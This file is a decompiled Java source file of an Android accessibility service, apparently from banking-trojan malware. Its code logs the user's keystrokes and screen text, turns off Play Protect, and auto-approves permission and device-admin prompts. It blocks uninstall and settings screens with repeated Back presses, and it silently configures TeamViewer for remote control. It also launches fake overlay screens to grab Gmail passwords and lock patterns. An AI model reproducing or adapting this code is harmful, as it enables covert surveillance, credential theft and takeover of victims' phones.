/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService
 *  android.accessibilityservice.AccessibilityServiceInfo
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Rect
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.util.Base64
 *  android.view.accessibility.AccessibilityEvent
 *  android.view.accessibility.AccessibilityNodeInfo
 */
package com.example.mmm.Service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Build;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;
import com.example.mmm.constants;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

public class srvAccessibility
extends AccessibilityService {
    utils utl = new utils();
    constants consts = new constants();
    utils2 utl2 = new utils2();
    String groups$;
    private String TAG_LOG;
    private boolean myers$;
    private String textKeylogger;
    private String packageAppStart;
    private String strText;
    private String className;
    private String app_inject;
    private String quantity$;
    private String reforms$;
    private String papers$;
    private String marie$;
    private int becomes$;
    private boolean admit$;
    private boolean drill$;
    private boolean grenada$;
    private boolean capable$;
    private boolean touring$;

    public srvAccessibility() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(srvAccessibility.class.getSimpleName());
        stringBuilder.append("   ");
        this.TAG_LOG = stringBuilder.toString();
        this.myers$ = false;
        this.textKeylogger = "";
        this.packageAppStart = "";
        this.strText = "";
        this.className = "";
        this.app_inject = "";
        this.quantity$ = "";
        this.reforms$ = "";
        this.papers$ = "";
        this.marie$ = "";
        this.becomes$ = 0;
        this.admit$ = false;
        this.drill$ = false;
        this.grenada$ = false;
        this.capable$ = false;
        this.touring$ = false;
        this.groups$ = "0";
    }

    private static String getEventText(AccessibilityEvent object) {
        StringBuilder stringBuilder = new StringBuilder();
        object = object.getText().iterator();
        while (object.hasNext()) {
            stringBuilder.append((CharSequence)object.next());
        }
        return stringBuilder.toString();
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    private void blockBack() {
        if (Build.VERSION.SDK_INT <= 15) return;
        int n2 = 0;
        do {
            this.performGlobalAction(1);
            ++n2;
        } while (true);
    }

    private void a(AccessibilityNodeInfo object) {
        if (this.capable$) return;
        if (Build.VERSION.SDK_INT < 18) return;
        if (object == null) {
            this.utl.Log(this.TAG_LOG, "nodeInfo == null");
            return;
        }
        Iterator iterator = object.findAccessibilityNodeInfosByViewId("com.android.vending:id/toolbar_item_play_protect_settings").iterator();
        while (iterator.hasNext()) {
            iterator.next();
            this.blockBack2();
        }
        object = object.findAccessibilityNodeInfosByViewId("com.android.vending:id/play_protect_settings").iterator();
        do {
            if (!object.hasNext()) {
                if (!this.className.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) return;
                this.blockBack2();
                return;
            }
            object.next();
            this.blockBack2();
        } while (true);
    }

    private void a(AccessibilityNodeInfo accessibilityNodeInfo, String string) {
        string = "str";
        if (Build.VERSION.SDK_INT <= 18) return;
        if (accessibilityNodeInfo == null) return;
        int n2 = accessibilityNodeInfo.getChildCount();
        int n3 = 0;
        while (n3 < n2) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(n3);
            if (accessibilityNodeInfo2 == null) return;
            CharSequence charSequence = new StringBuilder();
            charSequence.append(string);
            charSequence.append(" > ");
            charSequence.append(accessibilityNodeInfo2.getClassName().toString());
            String string2 = charSequence.toString();
            charSequence = "";
            if (accessibilityNodeInfo2.getText() != null) {
                charSequence = accessibilityNodeInfo2.getText().toString();
            }
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append(n3);
            stringBuilder2.append(" Class: ");
            stringBuilder.append(stringBuilder2.toString());
            stringBuilder.append(accessibilityNodeInfo2.getClassName().toString());
            stringBuilder.append("; Text: ");
            stringBuilder.append((String)charSequence);
            stringBuilder.append("; ID: ");
            stringBuilder.append(accessibilityNodeInfo2.getViewIdResourceName());
            stringBuilder.append("; ");
            stringBuilder.append(string2);
            this.utl.Log("A_A_A", stringBuilder.toString());
            if (this.className.contains("com.google.android.finsky.activities.mainactivity")) {
            }
            if (this.groups$.equals("1")) {
            }
            this.a(accessibilityNodeInfo2, string2);
            ++n3;
        }
    }

    private void blockBack2() {
        if (Build.VERSION.SDK_INT <= 15) return;
        int n2 = 0;
        do {
            this.performGlobalAction(1);
            ++n2;
        } while (true);
    }

    private void b(AccessibilityNodeInfo object, String string) {
        Object object2;
        int n2;
        if (object == null) {
            this.utl.Log(this.TAG_LOG, "nodeInfo == null");
            return;
        }
        if (!this.capable$) return;
        if (Build.VERSION.SDK_INT < 18) return;
        if (this.packageAppStart.equals("com.android.vending")) {
            int n3;
            int n4;
            if (this.groups$.equals("1")) {
                n3 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                n4 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE"));
                for (n2 = 0; n2 < n4 / 2; n2 += 50) {
                    object2 = object.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();
                    if (object2.hasNext()) {
                        ((AccessibilityNodeInfo)object2.next()).performAction(16);
                        this.groups$ = "0";
                        this.utl.SettingsWrite((Context)this, "SR", "0");
                        this.capable$ = false;
                        this.blockBack2();
                    }
                    if (this.groups$.isEmpty()) break;
                    utils2._plains(this, n3 / 2, n2 + 40);
                }
            }
            this.a((AccessibilityNodeInfo)object, "str");
            if (string.contains("com.google.android.finsky.activities.mainactivity")) {
                n3 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                n4 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE"));
                this.groups$ = "1";
                for (n2 = 0; n2 < n4 / 2; n2 += 5) {
                    utils2._plains(this, n3 - 10, n2);
                }
            }
        } else {
            if (string.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
                int n5;
                this.groups$ = "1";
                object.performAction(4096);
                int n6 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SW"));
                int n7 = n5 = Integer.parseInt(this.utl.SettingsRead((Context)this, "SE"));
                while (n7 > 30) {
                    utils2._plains(this, n6 / 2, n5 - n7);
                    n7 -= 15;
                }
                return;
            }
            if (!string.equals("android.app.alertdialog")) return;
            if (!this.groups$.equals("1")) return;
            object = object.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();
            while (object.hasNext()) {
                ((AccessibilityNodeInfo)object.next()).performAction(16);
                this.groups$ = "0";
                this.capable$ = false;
                this.blockBack2();
            }
            return;
        }
        object2 = new String[]{"com.android.vending:id/toolbar_item_play_protect_settings", "com.android.vending:id/play_protect_settings", "android:id/button1"};
        n2 = 0;
        do {
            Iterator iterator = object.findAccessibilityNodeInfosByViewId((String)object2[n2]).iterator();
            while (iterator.hasNext()) {
                ((AccessibilityNodeInfo)iterator.next()).performAction(16);
                this.groups$ = "1";
                if (!((String)object2[n2]).equals("android:id/button1")) continue;
                this.groups$ = "0";
                this.capable$ = false;
                this.utl.SettingsWrite((Context)this, "SR", "0");
                this.blockBack2();
            }
            ++n2;
        } while (true);
    }

    public void onAccessibilityEvent(AccessibilityEvent object) {
        Object object2;
        Object object3;
        int n2;
        Object object4;
        Object object5;
        block74 : {
            block73 : {
                Object object6;
                block72 : {
                    if (4 == object.getEventType() && !utils.getScreenBoolean((Context)this)) {
                        this.utl.Log(this.TAG_LOG, "click unlock device");
                        if (this.myers$) {
                            object2 = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
                            object5 = new StringBuilder();
                            object5.append(this.textKeylogger);
                            object5.append((String)object2);
                            object5.append("[Focused]");
                            object5.append("click unlock device");
                            object5.append("[#2453102]");
                            this.textKeylogger = object5.toString();
                        }
                    }
                    if (!utils.getScreenBoolean((Context)this)) {
                        return;
                    }
                    if (object == null) {
                        return;
                    }
                    if (this.myers$) {
                        object2 = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
                        n2 = object.getEventType();
                        if (n2 != 1) {
                            if (n2 != 8) {
                                if (n2 != 16) {
                                    if (object.getText().toString().length() >= 3) {
                                        object5 = new StringBuilder();
                                        object5.append(this.textKeylogger);
                                        object5.append((String)object2);
                                        object5.append("[Focused]");
                                        object5.append(object.getText().toString().length());
                                        object5.append(" # ");
                                        object5.append(object.getText().toString());
                                        object5.append("[#2453102]");
                                        this.textKeylogger = object5.toString();
                                    }
                                } else if (!object.getText().toString().equals("")) {
                                    object5 = new StringBuilder();
                                    object5.append(this.textKeylogger);
                                    object5.append((String)object2);
                                    object5.append("[Wtore Text]");
                                    object5.append(object.getText().toString());
                                    object5.append("[#2453102]");
                                    this.textKeylogger = object5.toString();
                                }
                            } else if (!object.getText().toString().equals("")) {
                                object5 = new StringBuilder();
                                object5.append(this.textKeylogger);
                                object5.append((String)object2);
                                object5.append("[Focused]");
                                object5.append(object.getText().toString());
                                object5.append("[#2453102]");
                                this.textKeylogger = object5.toString();
                            }
                        } else if (!object.getText().toString().equals("")) {
                            object5 = new StringBuilder();
                            object5.append(this.textKeylogger);
                            object5.append((String)object2);
                            object5.append("[Click]");
                            object5.append(object.getText().toString());
                            object5.append("[#2453102]");
                            this.textKeylogger = object5.toString();
                        }
                    }
                    this.app_inject = object.getPackageName().toString();
                    this.packageAppStart = object.getPackageName().toString().toLowerCase();
                    this.strText = srvAccessibility.getEventText((AccessibilityEvent)object).toLowerCase();
                    this.className = object.getClassName().toString().toLowerCase();
                    if (32 != object.getEventType()) break block72;
                    object2 = object.getSource();
                    object5 = this.utl;
                    object3 = this.TAG_LOG;
                    object4 = new StringBuilder();
                    ((StringBuilder)object4).append("packageApp{");
                    ((StringBuilder)object4).append(this.packageAppStart);
                    ((StringBuilder)object4).append("} strText{");
                    ((StringBuilder)object4).append(this.strText);
                    ((StringBuilder)object4).append("} className{");
                    ((StringBuilder)object4).append(this.className);
                    ((StringBuilder)object4).append("}");
                    object5.Log((String)object3, ((StringBuilder)object4).toString());
                    this.utl._currency((Context)this);
                    if (this.utl2._console(this, (AccessibilityEvent)object, this.className)) {
                        this.blockBack2();
                    }
                    this.utl2._presence(this, (AccessibilityEvent)object, this.packageAppStart);
                    this.utl2._referral((AccessibilityEvent)object, this.className);
                    this.utl2._obtain((AccessibilityEvent)object, this.className);
                    if (Build.VERSION.SDK_INT >= 29) {
                        object5 = this.utl2;
                        object3 = this.packageAppStart;
                        object4 = this.strText;
                        object6 = this.className;
                        n2 = Build.VERSION.SDK_INT >= 18 && ((String)object6).equals("com.android.settings.applications.installedappdetailstop") && ((String)object3).equals("com.android.settings") && ((String)object4).length() > 10 ? 1 : 0;
                    }
                    if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
                        this.touring$ = this.utl.SettingsRead((Context)this, "XB").equals("1");
                        if (!this.touring$) {
                            if (!this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity")) {
                                this.utl2._cornell((Context)this);
                            }
                            if (this.utl2._declared(this, (AccessibilityEvent)object, this.className)) {
                                this.utl2._fires((Context)this);
                                this.touring$ = true;
                                this.blockBack2();
                            }
                        } else if (this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity") && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                            this.blockBack2();
                        }
                        if (this.className.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) {
                            if (!this.utl.SettingsRead((Context)this, "XS").equals("1")) {
                                if (this.utl2._bases(this, (AccessibilityEvent)object, this.className)) {
                                    this.utl.Log(this.TAG_LOG, "Click AutoStart");
                                    this.utl.SettingsWrite((Context)this, "XS", "1");
                                    this.blockBack2();
                                    if (!this.utl.SettingsRead((Context)this, "XH").equals("1")) {
                                        this.utl2._tulsa((Context)this);
                                    }
                                }
                            } else {
                                this.blockBack();
                            }
                        }
                        if (this.className.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) {
                            if (!this.utl.SettingsRead((Context)this, "XH").equals("1")) {
                                if (this.utl2._phone((AccessibilityEvent)object, this.className)) {
                                    this.utl.Log(this.TAG_LOG, "Click isXiaomiHiddenappsconfigactivity");
                                    this.utl.SettingsWrite((Context)this, "XH", "1");
                                    this.blockBack2();
                                }
                            } else if (this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                                this.blockBack();
                            }
                        }
                        if (this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase()) && this.className.contains("com.miui.appmanager.applicationsdetailsactivity")) {
                            this.blockBack();
                        }
                        if (this.packageAppStart.contains("com.miui.cleanmaster") && this.className.contains("com.miui.optimizecenter.deepclean.installedapp.installedappsactivity")) {
                            this.blockBack();
                        }
                    }
                    if (!this.packageAppStart.isEmpty()) {
                        this.utl.SettingsWrite((Context)this, "RW", this.packageAppStart);
                    }
                    if (Build.VERSION.SDK_INT > 15 && "com.android.settings.SubSettings".equals(object.getClassName()) && this.strText.equals("g\u00c3\u00bcncelleme".toLowerCase())) {
                        this.blockBack();
                        this.utl.SettingsToAdd((Context)this, "AS", "Blocked attempt to disable accessibility service[143523#]");
                    }
                    this.quantity$ = this.utl.SettingsRead((Context)this, "RE");
                    this.reforms$ = this.utl.SettingsRead((Context)this, "GE");
                    this.myers$ = this.utl.SettingsRead((Context)this, "AC").equals("1");
                    this.capable$ = this.utl.SettingsRead((Context)this, "SR").equals("1");
                    if (this.textKeylogger.length() > 20) {
                        object5 = this.utl;
                        object3 = this.TAG_LOG;
                        object4 = new StringBuilder();
                        ((StringBuilder)object4).append("Log Keylogger Size: ");
                        ((StringBuilder)object4).append(this.textKeylogger.length());
                        object5.Log((String)object3, ((StringBuilder)object4).toString());
                        this.utl.SettingsToAdd((Context)this, "AM", this.textKeylogger);
                        this.textKeylogger = "";
                    }
                    if (object2 == null) {
                        this.utl.Log(this.TAG_LOG, "nodeInfo == null");
                        return;
                    }
                    if (Build.VERSION.SDK_INT < 18) break block72;
                    if (this.utl.SettingsRead((Context)this, "SQ").equals("1")) break block73;
                    if (!this.utl.SettingsRead((Context)this, "QR").isEmpty()) break block74;
                }
                this.a(object.getSource());
                this.b(object.getSource(), this.className);
                if (!this.utl.SettingsRead((Context)this, "QR").equals(this.getPackageName())) {
                    if (object.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase())) {
                        this.blockBack();
                        object2 = this.utl;
                        object5 = "AS";
                        object3 = new StringBuilder();
                        ((StringBuilder)object3).append("Blocked attempt to remove bot");
                        ((StringBuilder)object3).append("[143523#]");
                        ((utils)object2).SettingsToAdd((Context)this, (String)object5, ((StringBuilder)object3).toString());
                    }
                    if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (object.getPackageName().toString().equals("com.android.settings") || object.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains(this.utl.getLabelApplication((Context)this).toLowerCase()) && !this.strText.contains("euwvxmpnqta".toLowerCase())) {
                        this.blockBack();
                        object2 = this.utl;
                        object5 = "AS";
                        object3 = new StringBuilder();
                        ((StringBuilder)object3).append("Blocked attempt to remove bot");
                        ((StringBuilder)object3).append("[143523#]");
                        ((utils)object2).SettingsToAdd((Context)this, (String)object5, ((StringBuilder)object3).toString());
                    }
                    if (this.className.equals("com.android.settings.deviceadminadd") && utils._exercise((Context)this)) {
                        this.blockBack();
                        object2 = this.utl;
                        object5 = "AS";
                        object3 = new StringBuilder();
                        ((StringBuilder)object3).append("Blocked attempt to disable admin device");
                        ((StringBuilder)object3).append("[143523#]");
                        ((utils)object2).SettingsToAdd((Context)this, (String)object5, ((StringBuilder)object3).toString());
                    }
                    if (object.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains("host") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                        this.blockBack();
                        object2 = this.utl;
                        object5 = "AS";
                        object3 = new StringBuilder();
                        ((StringBuilder)object3).append("Blocked attempt to remove TeamViewer");
                        ((StringBuilder)object3).append("[143523#]");
                        ((utils)object2).SettingsToAdd((Context)this, (String)object5, ((StringBuilder)object3).toString());
                    }
                    if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (object.getPackageName().toString().equals("com.android.settings") || object.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains("host") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                        this.blockBack();
                        object2 = this.utl;
                        object5 = "AS";
                        object3 = new StringBuilder();
                        ((StringBuilder)object3).append("Blocked attempt to remove TeamViewer");
                        ((StringBuilder)object3).append("[143523#]");
                        ((utils)object2).SettingsToAdd((Context)this, (String)object5, ((StringBuilder)object3).toString());
                    }
                }
                if (Build.VERSION.SDK_INT >= 18) {
                    if (this.packageAppStart.contains("com.teamviewer.host.market")) {
                        object2 = utils2._selling((AccessibilityEvent)object, "com.teamviewer.host.market:id/host_assign_device_username");
                        object5 = utils2._selling((AccessibilityEvent)object, "com.teamviewer.host.market:id/host_assign_device_password");
                        object3 = utils2._selling((AccessibilityEvent)object, "com.teamviewer.host.market:id/host_assign_device_submit_button");
                        if (object2 != null) {
                            this.papers$ = this.utl.SettingsRead((Context)this, "RT");
                            if (!this.papers$.isEmpty()) {
                                this.marie$ = this.utl.SettingsRead((Context)this, "RY");
                                this.grenada$ = false;
                                this.drill$ = false;
                                this.admit$ = false;
                                this.becomes$ = 0;
                                this.utl.SettingsWrite((Context)this, "RT", "");
                                this.utl.SettingsWrite((Context)this, "RY", "");
                            }
                        }
                        if (this.becomes$ == 0) {
                            object4 = utils2._selling((AccessibilityEvent)object, "com.teamviewer.host.market:id/action_bar_root");
                            object6 = utils2._selling((AccessibilityEvent)object, "com.teamviewer.host.market:id/buttonPanel");
                            if (object4 != null && object6 != null) {
                                this.becomes$ = 1;
                                object4 = utils2._selling((AccessibilityEvent)object, "android:id/button1");
                                if (object4 != null) {
                                    this.utl2._shannon((AccessibilityNodeInfo)object4);
                                }
                                object4 = utils2._selling((AccessibilityEvent)object, "com.samsung.klmsagent:id/checkBox1");
                                object6 = utils2._selling((AccessibilityEvent)object, "com.samsung.klmsagent:id/btn_confirm");
                                if (object4 != null && this.becomes$ == 1) {
                                    this.utl2._shannon((AccessibilityNodeInfo)object4);
                                    this.utl2._shannon((AccessibilityNodeInfo)object6);
                                    this.becomes$ = 2;
                                    utils.runApplication((Context)this, "com.teamviewer.host.market");
                                }
                            }
                        }
                        if (!this.papers$.isEmpty() && !this.marie$.isEmpty()) {
                            if (object2 != null && !this.admit$) {
                                utils2._batch((AccessibilityNodeInfo)object2, this.papers$);
                                this.admit$ = true;
                            }
                            if (object5 != null && !this.drill$) {
                                utils2._batch((AccessibilityNodeInfo)object5, this.marie$);
                                this.drill$ = true;
                            }
                            if (this.admit$ && this.drill$ && !this.grenada$) {
                                this.becomes$ = 0;
                                this.utl2._shannon((AccessibilityNodeInfo)object3);
                                this.grenada$ = true;
                                if (this.utl.SettingsRead((Context)this, "RI").equals("true")) {
                                    this.blockBack2();
                                }
                            }
                        }
                    } else if (this.packageAppStart.contains("com.samsung.klmsagent")) {
                        object2 = utils2._selling((AccessibilityEvent)object, "com.samsung.klmsagent:id/checkBox1");
                        object5 = utils2._selling((AccessibilityEvent)object, "com.samsung.klmsagent:id/btn_confirm");
                        if (object2 != null && this.becomes$ == 1) {
                            this.utl2._shannon((AccessibilityNodeInfo)object2);
                            this.utl2._shannon((AccessibilityNodeInfo)object5);
                            this.becomes$ = 2;
                            utils.runApplication((Context)this, "com.teamviewer.host.market");
                        }
                    } else {
                        this.becomes$ = 0;
                    }
                    if (this.packageAppStart.contains("com.teamviewer.host.market") && this.utl.SettingsRead((Context)this, "RA").equals("true")) {
                        this.blockBack2();
                    }
                }
                if (this.quantity$.isEmpty() && this.reforms$.isEmpty()) {
                    object = this.utl.SettingsRead((Context)this, "QP");
                    if (((String)object).isEmpty()) return;
                    if (!((String)object).contains(this.app_inject)) return;
                    if (!this.app_inject.contains(".")) return;
                    boolean bl = utils.getScreenBoolean((Context)this);
                    if (!bl) return;
                    object = new Intent((Context)this, actViewInjection.class);
                    object.addFlags(268435456);
                    object.addFlags(8388608);
                    this.utl.SettingsWrite((Context)this, "RF", this.app_inject);
                    this.startActivity((Intent)object);
                    return;
                }
                if (32 != object.getEventType()) return;
                if (!this.quantity$.isEmpty()) {
                    object = new Intent((Context)this, actViewInjection.class);
                    object.addFlags(268435456);
                    object.addFlags(8388608);
                    this.utl.SettingsWrite((Context)this, "RF", "grabbing_pass_gmail");
                    this.startActivity((Intent)object);
                }
                if (this.reforms$.isEmpty()) return;
                object = new Intent((Context)this, actViewInjection.class);
                object.addFlags(268435456);
                object.addFlags(8388608);
                this.utl.SettingsWrite((Context)this, "RF", "grabbing_lockpattern");
                this.startActivity((Intent)object);
                return;
            }
            object5 = new String[]{"com.android.packageinstaller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button", "com.android.settings:id/button1"};
            n2 = 0;
            do {
                object3 = object2.findAccessibilityNodeInfosByViewId(object5[n2]).iterator();
                block1 : while (object3.hasNext()) {
                    ((AccessibilityNodeInfo)object3.next()).performAction(16);
                    this.utl.SettingsWrite((Context)this, "SQ", "");
                    this.utl.Log(this.TAG_LOG, "-=CLICK BUTTON=-");
                    if (!object5[n2].contains("com.android.settings:id/action_button") || utils._exercise((Context)this)) continue;
                    object4 = new Rect();
                    object2.getBoundsInScreen((Rect)object4);
                    int n3 = 0;
                    do {
                        int n4 = object4.centerY();
                        utils2._plains(this, object4.centerX(), n4 - 250 + n3);
                        if (utils._exercise((Context)this)) continue block1;
                        n3 += 4;
                    } while (true);
                }
                ++n2;
            } while (true);
        }
        object5 = "com.android.settings:id/left_button";
        object3 = "android:id/button1";
        n2 = 0;
        do {
            object4 = object2.findAccessibilityNodeInfosByViewId(new String[]{object5, object3}[n2]).iterator();
            while (object4.hasNext()) {
                ((AccessibilityNodeInfo)object4.next()).performAction(16);
            }
            ++n2;
        } while (true);
    }

    public void onInterrupt() {
        this.utl.Log(this.TAG_LOG, "onInterrupt");
    }

    protected void onServiceConnected() {
        super.onServiceConnected();
        this.utl.Log(this.TAG_LOG, "onServiceConnected");
        this.blockBack2();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 17;
        accessibilityServiceInfo.eventTypes = -1;
        accessibilityServiceInfo.feedbackType = 16;
        this.setServiceInfo(accessibilityServiceInfo);
    }
}

